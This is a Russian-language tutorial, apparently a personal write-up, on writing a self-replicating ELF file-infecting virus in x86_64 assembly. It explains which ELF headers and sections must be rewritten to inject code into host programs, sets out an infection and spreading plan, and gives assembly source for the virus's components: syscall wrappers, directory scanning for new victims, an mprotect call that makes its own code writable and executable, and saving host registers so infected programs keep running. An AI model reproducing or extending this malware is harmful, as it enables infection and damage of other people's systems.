#+STARTUP: showall indent hidestars
** Устройство эльфа
Зачем вообще нужны ELF файлы?
Нам нужно сообщать загрузчику, что мы хотим загрузить: как и с каких
адресов располагать сегменты кода, сколько места они занимают, какие
библиотеки нужны и нужны ли вообще и т.д. Всю эту информацию о программе
загрузчик черпает из эльфа.

Подробно о ELF-формате можно прочитать вот здесь:
https://refspecs.linuxfoundation.org/elf/elf.pdf

А чтоб посмотреть, как в эльфе все устроено, можно использовать утилиту
~readelf~ с разнообразными ключами.

*** Общее устройство эльф-файла
Эльф файл состоиз из:
- заголовка эльфа
- таблицы заголовков сегментов - заголовки сегментов просто идут один за
  другим, пока не кончатся. Их колчичество зависит от того, на сколько
  сегментов компилятор поделил код программы
- сам код программы - его-то мы и пишем + его дополняет компилятор
  (например, разделом кода PLT/GOT, который необходим при использовании
  динамических либ)
- таблица заголовков секций - заголовки так же идут один за другим.

Секции - это тоже разннобразный код. Отличие секций от сегментов в том,
что секции меньше, они объединяются в сегменты кода. У каждой секции есть
свое назначение (как и укаждого сегмента).
В англоязычных источниках заголовки сегментов часто упоминаются как
~program header~, т.е. заголовки программ.

*** Заголовок эльфа
Это структура, которая содержит в себе информацию о
точке входа - метка ~start~ программы, -  количестве заголовков сегментов,
их размере, их смещении от начала файла, количестве загоолвков секций, их
размере, где их искать в файле и т.д.

Чтоб посмотреть заголовок эльфа, можно использовать ~readelf -h elf_filename~
*** Таблица заголовков программ
Представляет собой несколько заголовков программ (сегментов), которые
идут один за другим.
Первый заголовок этой таблицы описывает всю таблицу - сколько места
занимает, какое смещение и т.д. Заголовок такого типа может быть в файле
в единственном числе, потому что в файле может быть только одна таблица
сегментов.

Каждый заголовок представляет собой структуру, описывающую один сегмент кода. Эта
структура содержит в себе информацию о типе сегмента (загружаемый -
т.е. загрузчик загрузит его в память процесса, только для чтения и т.д.) его размере,
смещении, виртуальном адресе и т.д.

Количество заголовоков сегментов зависит от количества сегментов в
программе.
Каждый заголовок на моей архитектура занимает 56 байт.
Опираясь на эти заголовки программ, загрузчик понимает, что ему грузить,
куда и откуда, а так же какого типа этот код - он же должен выставить
атрибуты (права) страницам памяти, в которые он грузит код. Чтоб,
например, код, предназначенный только для чтения, не был воспринят как
исполняемый.

Затем идет весь код программы, который написал программист и дополнил
компилятор.

Заголовки сегментов можно посмотреть с помощью  ~readelf -l elf_filename~
*** Таблица заголовков секций
Эта таблица заголовков замыкает собой эльф-файл. Ее устройство похоже на
устройство талицы заголовков сегментов.

Каждый заголовок описывает одну секцию кода, сообщая, где она лежит в
файле, ее виртуальный адрес, тип и т.д. Как и в случае с заголовками
сегментов, есть типы заголовков, которые могут встречаться лишь однажды в
файле - поскольку код, который они описывают, может быть в файле только в
единственном экземпляре.

Например, не может быть в одном файле двух секций ~dynamic~ или двух
таблиц ~GOT~.

Заголовки сегментов можно посмотреть с помощью  ~readelf -S elf_filename~
Об устройстве эльфа подробно и довольно просто написано вот здесь
https://stevens.netmeister.org/631/elf.html


** Какие секции и сегменты критично важны для корректной работы эльф-файла

Вообще, если секция или сегмент есть в файле, значит они нужны, компилятор абы что в
файл пихать не будет - очевидная мысль, я знаю.

Но некоторые секции и сегменты кода критически важны для правильной загрузки и
исполнения эльф-файла. Если мы во время заражения как-то неправильно
отредактируем их, то файл либо не загрузится, либо не слинкуется, либо
завершит исполнение сегфолтом.

Критически важна информация, содержащаяся во всех заголовках: в
заголовках секций, сегментов и самого эльфа. Как было уже сказано выше,
именно из них черпается информация, каким образом следует разместить эльф
в памяти.

Если наш эльф файл собран с без каких-либо библиотек, например, он
написан на ассмеблере, и ему не требуется ~libc~, которая обеспечивает
корректный старт любой сишной программы, то корректного редактирования
заголовков будет достаточно, чтоб правильно оформить вставку кода
вируса.

Но если файл собран с либами, то все становится значительно веселее,
потому что в игру вступает линкер, механизм PLT/GOT и "ленивое" (или нет,
если выставить соответствующий флаг при компиляции программы)
связывание.

Для корректной работы линкера необходимы секции
- ~rela~ - их может быть несколько в файле
- ~dynamic~ - она бывает только одна
- ~got~ - она так же бывает только в единственном числе
- ~symtab~ - опять же в единственная и неповторимая

Секции типа ~rela~ содержат в себе информацию о ~релокейтах~. Именно
оттуда линкер берет информацию, какие символы необходимо связать, кким
образом это сделать и где будет находиться этот символ в программе -
т.е. его виртуальный адрес.
Посмотреть, как выглядит секция ~rela~ можно, использовав ~readelf -r elf_name~

Секция ~got~ - содержит в себе таблицу ~GOT~, которая содержит в себе
адреса, на которые мы переходим в случае, когда вызывается библиотечная
функция. О механизме ~PLT/GOT~ можно прочитать вот тут
http://rigidus.ru/doc/got-plt.html

Секция ~symtab~ представляет собой таблицу символов, где каждая запись -
это имя символа (название функции, переменной и т.д.) и адрес, по
которому этот символ объявлен.

Подробно о символах написано здесь
https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/
Посмотреть, как выглядит секция ~symtab~ можно, использовав ~readelf -s elf_name~

Ну и самая важная в этом списке секция ~dynamic~.
Именно из нее линкер во время загрузки (да, линкер вызывается и во время
загрузки, чтоб связать библиотеки друг с другом, например, и во время
рантайма, если у нас используется "ленивое" связывание) берет информацию,
где искать секции ~rela~, ~got~ и др. Соответственно, если информация в
секции ~dynamic~ не соответствует тому, где на самом деле расположен код,
программа завершится сегфолтом до того, как на нее фактически будет
передано управление.

Посмотреть, что находится в секции ~dynamic~ в эльфе можно, используя
~readelf -d elf_name~.

Поэтому если ваш алгоритм заражения предполагает, что код жертвы
сдвинется в файле в ту или иную сторону, то вам нужно держать в уме
называнные секции. Иначе вас ждут увлекательные часы отладки (как это
было со мной).


*** TODO описать работу линкера и релокетойв подробно, дать ссылки на используемые источники.

** Заражение файла
*** Используемые технологии
- язык реализации вируса ~GNU asm x86_64~
- компилятор ~gcc~
- средства отладки: ~objdump~, ~gdb~ и ~readelf~


Вирус написан на ассмеблере, поскольку ассемблер мало весит, но при этом
обладает всеми необходимыми выразительными средствами для написания
вируса. К тому же, было решено собирать вирус без сишных либ, поскольку
это облегчает заражние - вирус становится меньше и зависит только сам от
себя, а не от слинкованных библиотек.

Если вы в глаза не видели никакой ассемблер, вот тут есть краткий
справочник.
http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html

*** Идея заражения
Как заразить файл? С чего начать?
Есть несколько наименее сложных вариантов, они неплохо описаны в книге Криса Касперски
"Записки исследователя компьютерных вирусов".

У меня же вариант такой: вирус располагается в файле сразу после кода
жертвы - то есть в том месте, где раньше у нее начинались заголовки
секций. Поскольку код вируса не является продолжением какого-либо
сегмента кода жертвы, то его придется оформлять в отдельный сегмент, а
следовательно, создавать для него отдельный заголовок сегмента и
отдельный заголовок секции.

Фактически, нам нужно просто найти место для вставки вируса,
сгенерировать его заголовки, пересчитать секции, которые я упоминал выше,
и вставить код вируса в файл. Выглядит несложно, правда?
Ну, первое впечатление обманчиво :)

Пожалуй, я расскажу, с какими проблемами столкнулся я, и как я их
решал, что ответит на вопрос, почему был выбран именно такой способ
заражения, хотя есть еще проще.

*** Мои ошибки на пути вирусописания
~Ошибка №1~
Сев писать вирус, я ничего не знал о том, как загружается и линкуется
программа. Более того, я даже не думал, что это может пригодиться
каким-то образом. Если бы я с самого начала знал, как все работает, это
сэкономило бы мне пару недель жизни, не меньше.

Восполняя свой пробел, я использовал следующие источники:
https://www.ques10.com/p/21825/explain-working-of-a-direct-linking-loader-with--1/
https://lwn.net/Articles/631631/
https://amir.rachum.com/blog/2016/09/17/shared-libraries/#example-setup
https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-vi.html

~Ошибка №2~
Я ничего не знал о старте и завершении сишной программы.
То есть я представлял себе это так: есть вот метка ~_start~, с нее
начинается исполнение проги. Внутри ~_start~ как-то там настраивается
стек и библиотеки, а потом передается управление на ~main~, а после того,
как мы из ~main~ вышли, мы как-то корректно завершаем программу.

В общем, если б я знал и это - а старт сишной проги, как и ее завершение,
тестно связаны с процессом линковки, - то это сэкономило бы мне еще
примерно неделю.

Так что пришлось почитать еще и вот это
https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html
и самому исследовать все под ~gdb~.

~Ошибка №3~
Прежде чем писать вирус, наверное, следовало бы внимательно взглянуть на
код жертвы, который генерирует мой компилятор. Что он там делает? Как это
работает?

Но я не стал. Ведь компилятор всегда прав, и я наивно полагал, что не
стоит ждать от него подлянки. О, как я ошибался.

Моя версия ~gcc~ генерирует ~позиционно-зависимый~ код. Это значит, что
даже если я совершенно идеально перечитаю все данные, необходимые для
корректной загрузки, линковки и исполнения программы, то моя жертва все
равно будет упорно выдавать сегфолты: где-то внутри нее, например в
секциях кода ~frame_dummy~, ~register_tm_clones~ и даже в самом ~start~ в
регистры кладутся абсолютные адреса, которые затем либо вызываются, либо
используются как параметры функций.

В результате, даже если код жертвы сдвинулся хоть на байт - а мы как бы
собирались вставлять целый заголовок вируса, что сдвигает код жертвы на
56 байт - не заработает просто ничего. Поэтому пришлось решать проблему с
урегулированием всех ссылок - как я это сделал, читайте дальше.

~Ошибка №4~
Которая является продолжением всех остальных.

Сев писать вирус и начитавшись Касперси, решил использовать самую простую
модель заражения:
- находим первый загружаемый сегмент кода (обычно в нем располагается
  метка ~_start~)
- находим в нем последнюю секцию
- вписываем вирус сразу после этой последней секции
- расширяем зараженную секцию и зараженный сегмент на размер вставляемого
  вируса (редактируем их заголовки)
- редактируем все остальные заголовки сегментов и секций - раз мы
  вставляем вирус, то весь остальной код жертвы "съедет" вниз в файле и в
  памяти на его размер
- редактируем все секции, какие нам необходимо
- перезаписываем инфицированный эльф

Этот способ позволяет не генерировать дополнительные заголовки, а так же
чуть менее заметен для антивируса.
И это хороший способ заразить файл, если бы не секции ~.plt~ и
~.got~. Хотя ~.plt~ и использует позиционно-независимый код, чтоб
обращаться к записям в ~got~, нам необходимо, чтоб расстояние между
этими секциями не менялось - иначе ~.plt~ будет продолжать обращаться к
~got~, которой уже нет на том месте.

И к сожалению, ~plt~ находится до первого загружаемого сегмента, а ~got~ -
после. И это знчит, что вставляя наш вирус в первый загружаемый сегмент
кода, мы значительно увеличиваем расстояние между этими секциями. В
результате чего программа жертвы выдает сегфолт.

Знающие люди подумали бы, что после того, как вирус отработает в жертве,
можно было бы сместить код жертвы так, чтоб затереть вирус, вернув все на
прежние адреса - тогда жертва спокойно отработала бы. Но мне этот способ
пришел в голову только когда я уже отказался от этой модели заражения,
избрал описанную выше и наткнулся на позиционно-зависимый код моего
компилятора.

~Ошибка №5~
Пока пишешь вирус, нужно думать не только о том, как он будет работать из
своего родного файла - это очевидно - но и о том, как он будет работать
из инфицированного файла.

И на самом деле между этими двумя состояниями есть разница, хотя код
формально один и тот же.
Например, весь ваш код должен быть позиционно-независимым. Вы не можете
использовать абсолютную адресацию, только косвенную. Потому что когда
ваше вирус окажется в чужом файле, его адреса изменятся.

К тому же, если, предположим, вы используете переменные. По умолчанию
внутри них значение ноль. Некоторые могут не заполняться по мере
исполнения вируса в одном случае, и заполняться в другом.

Когда вы записиываете код вируса в инфицированный файл, то вместе с кодом
вы записываете и переменные с теми значениями, которые в них оказалисьна
момент записи вируса в файл.
Поэтому когда вирус начнет работать в инфицированном файле, то эти
переменные уже не будут заполнены нулями - в них будут какие-то други,
старые значения.

Представляете себе пространство для ошибок?
Поэтому пока пишете вирус, всегдай думайте, как он будет исполняться из
чужого файла.

*** Суммируем общую идею заражения
- найти место, куда вставлять вирус - в нашем случае это адрес таблицы
  заголовков секций, а сами они "съедут" вниз в файле
- создать заголовки для вируса
- пересчитать все, что должно быть пересчитано
- создать механизм, который позволит сдвигать код инфицированной жертвы на ее прежние
  адреса в памяти процесса после того, как вирус отработает
- вписать все в файл

** Подробный разбор вируса
*** Принципы работы вируса

Чтоб вирус в будущем был расширяемым, мы будем писать небольшие куски
кода, каждый из которых будет совершать строго ограниченный набор
действий - например, только искать заголовки секций, или только искать
секцию ~dynamic~.


Наши функции за редким случаем не будут пинимать параметров. Вместо этого
они будут брать значения из глобальных переменных и смотреть,
удовлетворяют ли эти значения их требованиям. Напримр, чтоб найти секцию
~.got~, нужно сначала найти секцию ~dynamic~, поэтому функция сначала
проверит, если данные ~dynamic~ уже.

В качестве возвращаемого значения функции возвращают в ~rax~ 0 - в случае
успеха - и -1 - в случае провала.

Это делает вирус расширяемым и легко поддерживаемым. В будущем функции
можно преобразовать в систему правил, где правило может подойти или не
подойти, а если не подошло ни одно правило, то вирус завершится.
А из системы правил мы вполне можем создать систему принятия решений,
когда вирус будет комбинировать правила для заражения файла, даже если
его формат ему не знаком.

*** Отладочный вывод
Наверное, прежде чем что-то писать, надо позаботиться об отладке. Нам
нужен вывод ошибок, а писать его вручную каждый раз - занятие муторное.
Поэтому сделаем макрос, который будет выводить ошибки и завершать
исполнение вируса, не дожидаясь сегфолта, если мы находимся в
дебаг-моде.

#+NAME: _debug_msg
#+BEGIN_SRC asm
  /// Если эта переменная существует,
  /// макросы будут генерировать отладочный вывод

      .set DEBUG_MODE, 1

      // Макрос для генерации сообщений об ошибках

      .macro ERR_MSG name msg
          .ifdef DEBUG_MODE
              \name\()_error:
                  lea     \name\()_msg_e(%rip), %rsi
                  mov     $len_e_\name, %rdx
                    jmp     _error_msg
              \name\()_msg_e:
                  .ascii "ERR: \msg\()\n"
                  .set len_e_\name, . - \name\()_msg_e
          .else
              \name\()_error:
                  jmp     \name\()_exit
          .endif
      .endm

#+END_SRC

*** Реализация библиотечных функций
Итак, если помните, вирус у нас собран без использования сишных
библиотек вообще. А тем не менее надо как-то открывать, закрывать файлы,
писать в них, печатать сообщения и т.д. Поэтому реализуем библиотечные функции
самостоятельно - разуммется, не целиком, а только ту часть, что нам
нужна.

Для этого нам понадобится авызывать разнообразные ~syscall~ и передавать
им параметры.
Номера ~syscall~ можно посмотреть вот тут
https://filippo.io/linux-syscall-table/
А как передавать прааметры можно выяснить, исследуя вызовы библиотек под
~gdb~.

Данная функция позволяет напечатать сообщение в ~stdout~
#+NAME: _my_write
#+BEGIN_SRC asm

  /// WRITE TO STDOUT
  /// @PARAMS
  ///   - %RSI - msg pointer
  ///   - %RDX - msg size
  _my_write:
      mov      $0x1, %rax          # write
      mov      %rax, %rdi          # to stdout
      syscall
      ret

#+END_SRC

Может возникнуть ситуация, когда длина строки, как и сама строка,
неизвестны на этапе компиляции вируса, а вывести нам ее во время
исполнения надо.
Так что реализуем ~strlen~

#+NAME: _my_strlen
#+BEGIN_SRC asm
  /// _MY_STRLEN
  /// PARAMS -
  /// RDI - указатель на строку
  /// Изменяет STRING_LENGTH
  _my_strlen:
      xor     %rax, %rax

      push    %rcx
      push    %rbx

      test    %rdi, %rdi
      je      _my_strlen_fail
      // je      _my_strlen_error

      mov     $0x64, %rcx
      repne   scasb

      mov     $0x64, %rbx
      sub     %rcx, %rbx
      mov     %rbx, %rax
      dec     %rax

      mov     %rax, string_length(%rip)
      xor     %rax, %rax

      jmp    _my_strlen_exit

  _my_strlen_fail:
      mov     $-1, %rax

  _my_strlen_exit:
      pop     %rbx
      pop     %rcx

      ret

      ERR_MSG _my_strlen "_my_strlen: NULL pointer"

#+END_SRC

Этот крошечный код позволяет открыть файл - он настолько маленький, что я
не стал оформлять его в отдельную функцию

В регистре RDI он принимает указатель на имя файла, а RSI - флаги (файл
открываем на чтение/запись/оба).

#+NAME: _my_open
#+BEGIN_SRC asm

      mov     $0x2, %rax  # fopen syscall
      syscall
#+END_SRC

Этот системный вызов позволяет смаппить - т.е. загрузить в память - все
содержимое открытого файла. Это позволит нам загрузить жертву в память,
распарсить ее - мы ж хотим узнать о ней все - отредактировать прямо в
памяти, а затем слить оттуда в файл.

После вызова в RAX мы получим адрес, по которому лежит файл в памяти, или
же отрицательное значение, если произошла какая-то ошибка.
#+NAME: _my_mmap
#+BEGIN_SRC asm

  /// MY_MMAP file into memory
  /// Считывает файл в память по заданному адресу.
  /// Флаги должны быть такими же, какие передавали
  /// open для открытия файла.
  /// @PARAMS
  ///  - %RDI - адрес для записи (по умолчанию NULL,
  ///           в этом случае назначается OS)
  ///  - %RSI - длина считываемого файла
  ///  - %RDX - права доступа к памяти
  ///           (RDONLY, RDWR и т.д.)
  ///  - %RCX -  права для доступа к памяти для
  ///            процессов (MMAP_SHARED, MMAP_PRIVATE)
  ///  * %R8 -   fd считываемого файла
  ///  * %R9 -   offset от начала считываемого файла
  /// @ RETURN VALUE
  /// * RAX - указатель на файл в памяти или отриц. заначени
  _my_mmap:
      push %rbx
      push %rcx
      push %rdx
      push %rbp
      push %r10

      mov %r9, %r15
      mov %rsi, %r13
      mov %rdi, %r12
      mov %ecx, %r14d

      movslq %r8d, %rbp
      movslq %edx, %rbx
      movslq %r14d, %r10
      mov $0x9, %eax

      syscall

      pop %r10
      pop %rbp
      pop %rdx
      pop %rcx
      pop %rbx
      ret

#+END_SRC

Кто прочитал комментарии к ~_my_mmap~ заметил, что в RSI ~_my_mmap~
принимает длину считываемого файла. Как получить это значение, не
используя черную магию?

В этом нам поможет реализация ~my_stаt~, которая узнает свойства файла, в
том числе и его размер.

#+NAME: _my_stat
#+BEGIN_SRC asm

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
  	ret

    ERR_MSG _my_stat "my_stat"

#+END_SRC

Так же мыхотим иметь возможность записать инфицированный код в файл. Для
этого мы будет использовать ~pwrite~. Его отличие от ~write~ состоит в
том, что ему можно указать смещение в файле, по которому он должен
писать, в то время как ~write~ будет писать сначала файла.
Это позволяет нам записывать инфицированный код в файл по кускам: а нам
это понадобится, поскольку, как минимум, нам нужно вписывать новые
заголовки вируса и сам вирус.

~pwite~ принимает:
- RDI - десктриптор файла, куда пишем
- RSI - адрес, по которму лежит то, что мы хотим записать
- RDX - размир записываемого
- RCX - смещение в файле, от которого пишем
- R10 - аналогично ~rcx~ (если нет загрузить смещени R10 тоже, то ~pwite~
  работает просто как ~write~)
#+NAME: _my_pwrite
#+BEGIN_SRC asm
    mov     $0x12, %rax   # syscall pwrite
    syscall

#+END_SRC

Даже человек, который ничего не знает вирусах, понимает, что эти вирусы
как-то размножаются по системе.
Самый простой вариант - это искать исполняемые файлы в папке и заражать
их, если они все еще не заражены.

Мы ограничимся только текущей папкой, чтоб случайно не перезаразить все
на нашем компе.

Для чтения директории в си есть прекрасная функция ~readdir~, которую мы
сейчас и реализуем.

~readdir~ работает следующим образом: она открывает заданную директорию (
у нас она указана в переменной ~dir_name~) и вызывает системный вызов
~getdents~, который считает все записи из каталога в буфер ~dir_buf~.
Таким образом мы получаем структуры записей всех файлов и папко в
заданном каталоге. В каждой такой структуре содержится и имя файла.
Так же мы сохраним указатель на первую структуру в буфере - это позволит
сдвигать указатель на следующую структуру файла, чтоб добыть его имя,
если предыдущий файл не подошел для заражения по какой-то причине.

#+NAME: _my_readdir
#+BEGIN_SRC asm
  /// Открывает директорию
  /// и считывает все ее записи в буфер
  _my_readdir:
      push    %rdi
      push    %rsi
      push    %rbx

      // открыть директорию
      lea     dir_name(%rip), %rdi
      mov     $0x0, %rsi
      mov     $0x2, %rax  # fopen syscall
      syscall
      test     %rax, %rax
      jl      _my_readdir_open_error

      // заполянем структуру потока
      lea     dir_struct(%rip), %rbx
      mov     %eax, (%rbx)
      movq    $0x8000, 0x8(%rbx) # размер буфера


      // параметры getdents
      mov     (%rbx), %rdi
      lea     dir_buf(%rip), %rsi
      mov     8(%rbx), %rdx

      // вызов getdents
      mov    $0x4e, %rax
      syscall

      // в случае успеха возвращ.
      // кол-во считанных байт
      // иначе 0
      cmp     $0x0, %rax
      jle     _my_readdir_read_error

      // сохранили указатель на первую структуру
      // в буфере
      lea     dir_buf_ptr(%rip), %rbx
      mov     %rsi, (%rbx)

      xor     %rax, %rax
      pop     %rbx
      pop     %rsi
      pop     %rdi
      ret

      ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
      ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"

#+END_SRC

Вирусу нужно обеспечить корректное завершение.

Обычно программа завергается инструкицией ~ret~, но не в нашем
случае, поскольку ~ret~ берет со стека адрес возврата в систему. А у нас
его не будет - мы же не настраиваем стек с помощью ~libc~. Если
использовать ~ret~, товирус завершится сегфолтом.
Поэтому мы реализуем ~exit~

#+NAME: _my_exit
#+BEGIN_SRC asm
  /// выход из инфектора
  _global_exit:
      mov $0x3c, %rax
      mov $0x0,  %rdi
      syscall
#+END_SRC

*** Подготовка работы вируса
Теперь самое интересное.
Чтоб вирус было легче записывать в файл жертвы,
нам нужно, чтоб весь его код находился в секции ~.text~ - так мы можем
записывать его одним вызовом. Но тем не менее, мы хотим использовать
переменные. И тут у нас проблема: переменные - это ~data~, если сделать
их частью ~.text~, то при поптыке записать что-то в них, нам ждет
сегфолт - ведь ~.text~ по умолчанию может только исполняться, а записыват
в него что-то во время исполнения нельзя.

Что делать?
Выход только один - разрешить коду вируса самомодификацию. И в этом нам
поможет ~mprotect~.

~mprotect~ позволяет изменить атрибуты страницы памяти процесса. То есть ели у нас
была страница памяти только на чтение, то вызвав ~mprotect~ с правами на
чтение и запись, мы разрешим этой странице чтение и запись.

В качестве параметров ~mprotect~ принимает:
- RDI - адрес страница памяти, атрибутф которой мы хотим изменить (адрес
  обязательно должен быть выровнен по 4КБ)
- RSI - размер в байтах - на каком отрезке страницы памяти мы меняем атрибуты
- RDX - новые атрибуты

Суммирую это, мы разрешаем самомодификацию кода вируса.

#+NAME: _my_mprotect
#+BEGIN_SRC asm
  /// Разрешает коду вируса писать
  /// в самого себя
  _allow_write_into_code:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      lea     _start(%rip), %rdi
      and     $~0xFFF, %rdi       # ..in %RDI
      lea     _fin_infector(%rip), %rsi   # get end addr

      sub     %rdi, %rsi          # total size - %RSI
      mov     $0x7, %rdx          # RW+EXEC flags - $RDX
      mov     $0xA, %rax          # mprotect handle
      syscall

      test    %rax, %rax
      jne     _allow_write_into_code_error

      mov     %rax, mprotect_ok(%rip)
  _allow_write_into_code_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx

      ret

      ERR_MSG _allow_write_into_code "mprotect in _start"
#+END_SRC

Есть еще критичные для выполнения задачи, которые нужно решить до
запуска вируса:
- настройка стека - раз мы не используем сишные либы, то стек надо
  настроить вручную
- сохранить все регистры, какими они были до старта прогаммы.
Для самого вируса значения, которые оставил загрузчик в регистрах,
совершенно неважны, но для инфицированной жертвы эти значения важны
критично - например, в регистре ~rdx~ загрузчик оставляет адрес
~_dl_fini~ - именно эта часть библиотеки ~libc~ обеспечивает сишной
программе корректное завершение. Если этот адрес потеряется, то сишная
программа завершится сегфолтном.
- восстановление регистров - раз соххранили, то после исполнения вируса
  надо восстановить значения

Вместо того, чтоб настраивать аппаратный стек, мы создадим свой. Для
этого нужно просто зарезервировать место в памяти, а затем загрузить
адрес начала стека в ~rsp~ - и все, дальше ~pop~ и ~push~ буду делать
свое дело.

#+NAME: _my_stack
#+BEGIN_SRC asm
  _stack_top:
      .space 6000, 0

  _stack_bottom:
      .quad 0

#+END_SRC

Так же хотелось бы иметь возможно по завершении вируса проверять, не
переполнен ли стек - ну мало ли, какой баг мы там закодили.

Так что установим "канарейку"
#+NAME: _check_canary
#+BEGIN_SRC asm
  #define CANARY_VAL 0xDEADBEEFBAADF00D

      // Марос для проверки, не переполнен ли стек
      .macro CHECK_CANARY
          .ifdef DEBUG_MODE
              mov     _canary(%rip), %rax
              mov    $CANARY_VAL, %rbx
              cmp    %rax, %rbx
              je      1f              # forward label 1
              lea     2f(%rip), %rsi  # forward label 2
              mov     $len_e_canary_\@, %rdx
              jmp     _error_msg
          2:
              .string "ERR: canary \@\n"
              .set len_e_canary_\@, . - 2b
          1:
          .endif
      .endm
#+END_SRC

Теперь можно сохранить регистры и присвоить ~rsp~ новое значение.
Сохраняем все регистры кроме ~rax~,  поскольку он уже изменен - а
неизменить его мы не можем.

Обратите внимание, что ~_save_registers~ завершается не ~ret~, а
джампом - поскольку мы изменили ~rsp~, он уже указывает не на адрес
возврата из функции, а в новый стек.
#+NAME: _save_registers
#+BEGIN_SRC asm
  /// Сохраняет все регистры кроме rax -
  /// он уже изменен - в переменные и
  /// настраивает стек
  /// Проверяет MPROTECT_OK
  _save_registers:
      mov     mprotect_ok(%rip), %rax
      test    %rax, %rax
      jne     _save_registers_fail

      mov     %rsp, old_rsp(%rip)
      lea     _stack_bottom(%rip), %rsp

      mov     %rbx, old_rbx(%rip)
      mov     %rdx, old_rdx(%rip)
      mov     %rcx, old_rcx(%rip)
      mov     %rdi, old_rdi(%rip)
      mov     %r8, old_r8(%rip)
      mov     %r9, old_r9(%rip)
      mov     %r10, old_r10(%rip)
      mov     %r11, old_r11(%rip)
      mov     %r12, old_r12(%rip)
      mov     %r13, old_r13(%rip)
      mov     %r14, old_r14(%rip)
      mov     %r15, old_r15(%rip)

      xor     %rax, %rax
      jmp     _save_registers_exit

  _save_registers_fail:
      mov     $-1, %rax

  _save_registers_exit:
      jmp     _prepare_data

#+END_SRC

А вот так мы возвращаем регистрам исходные значения.

#+NAME: _my_stack
#+BEGIN_SRC asm
      /// Возвращает регистры в состояние
      /// до исполнения вируса
      _restore_registers_and_stack:
          mov     old_rsp(%rip), %rsp     # restore old %RSP
          mov     old_rbx(%rip), %rbx
          mov     old_rdx(%rip), %rdx
          mov     old_rcx(%rip), %rcx
          mov     old_rdi(%rip), %rdi
          mov     old_rsi(%rip), %rsi
          mov     old_r8(%rip), %r8
          mov     old_r9(%rip), %r9
          mov     old_r10(%rip), %r10
          mov     old_r11(%rip), %r11
          mov     old_r12(%rip), %r12
          mov     old_r13(%rip), %r13
          mov     old_r14(%rip), %r14
          mov     old_r15(%rip), %r15

      <<_my_exit>>
#+END_SRC

Помните, что я говорил о переменных и своей ~ошибке №5~?
Перед каждым запуском вируса нужно очистить значения в них до "по
умоланию". В моем случае это нулевое значение, а в некоторых случаях -1.

Если этого не сделать, то отлаживаться вы будете долго и мучительно.

В этом нам поможет функция ~clear_array~. Она принимает два адреса:
~from~ - с какого адреса нужно заполнить байты нулями, и ~to~ - до какого
адреса заполнять.

Затем высчитывает разницу между этими точками и заполняет все между ними
нулями.
#+NAME: _clear_array
#+BEGIN_SRC asm
  /// _CLEAR_ARRAY
  /// Заполняет все нулями
  /// с точки from до точки to
  _clear_array:
      push    %rcx

      mov     clear_from(%rip), %rax
      test    %rax, %rax
      je      _clear_array_fail

      mov     clear_to(%rip), %rcx
      test    %rcx, %rcx
      je      _clear_array_fail

      sub     %rax, %rcx
  _clear_array_cycle:
      movb    $0x0, (%rax)
      inc     %rax
      loop    _clear_array_cycle

  _clear_array_success:
      xor     %rax, %rax
      jmp     _clear_array_exit

  _clear_array_fail:
      mov     $-1, %rax

  _clear_array_exit:
      pop     %rcx
      ret
#+END_SRC

А вызовет нам ее функция ~_clear_old_data~, которая установит во все
переменные значения по умолчанию.

#+NAME: _clear_old_data
#+BEGIN_SRC asm
  /// Очищает все переменные,
  /// занося в них значения "по умолчанию"
  _clear_old_data:
      push    %rbx
      leaq    clear_from(%rip), %rax
      leaq    clear_to(%rip), %rbx

      mov     %rbx, clear_to(%rip)
      mov     %rax, clear_from(%rip)

      call    _clear_array

      movq    $-1, parse_success(%rip)
      movq    $-1, get_virus_success(%rip)
      movq    $-1, recount_success(%rip)

      xor     %rax, %rax
      jmp     _clear_old_data_exit

  _clear_old_data_fail:
      mov     $-1, %rax

  _clear_old_data_exit:
      pop    %rbx
      ret

#+END_SRC
